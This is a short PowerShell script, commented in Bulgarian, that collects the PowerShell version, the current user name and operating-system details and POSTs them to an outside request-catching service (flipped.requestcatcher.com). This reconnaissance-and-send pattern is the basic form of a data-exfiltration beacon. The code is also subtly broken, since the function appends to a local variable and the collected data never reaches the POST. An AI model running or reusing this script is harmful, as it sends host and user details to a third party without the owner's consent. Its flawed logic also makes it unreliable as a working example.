# === Инициализация ===
$output = ""

function Add-ToOutput {
    param([string]$Title, [object]$Data)
    $output += "`n===== [$Title] =====`n"
    $output += "$($Data | Out-String)`n"
}

# === Събиране на реални данни ===
Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
Add-ToOutput "Current User" (whoami)

try {
    $os = Get-CimInstance Win32_OperatingSystem
    Add-ToOutput "OS" "$($os.Caption) $($os.Version)"
} catch {
    Add-ToOutput "OS" "ERROR: $($_.Exception.Message)"
}

# === DEBUG – показване на съдържание ===
Write-Host "DEBUG OUTPUT:"
Write-Host $output

# === POST заявка ===
try {
    $body = @{ debug = $output }
    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" `
                      -Method POST `
                      -Body $body `
                      -UseBasicParsing
    Write-Host "`nPOST sent successfully!"
} catch {
    Write-Host "`nPOST FAILED: $($_.Exception.Message)"
}
